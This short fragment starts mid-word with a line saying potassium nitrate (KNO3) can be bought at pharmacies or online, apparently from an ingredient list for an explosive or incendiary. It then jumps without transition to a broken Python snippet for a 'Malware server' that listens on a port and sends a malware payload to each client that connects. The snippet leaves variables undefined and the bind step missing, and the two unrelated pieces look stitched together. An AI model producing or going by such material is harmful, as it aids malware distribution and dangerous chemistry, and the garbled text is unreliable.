rate (KNO3) - This can be found in most pharmacies or online.

```python
server_port = 8080

# Bind the socket to the IP address and port

# Listen for incoming connections
server_socket.listen(5)

print(f"Malware server started. Listening on {server_ip}:{server_port}...")

    # Send the malware payload to the client
    client_socket.sendall(malware_payload.encode())

    # Close the connection
    client_socket.close()

    # Wait for a short period of time before accepting the next connection
    time.sleep(1)
```
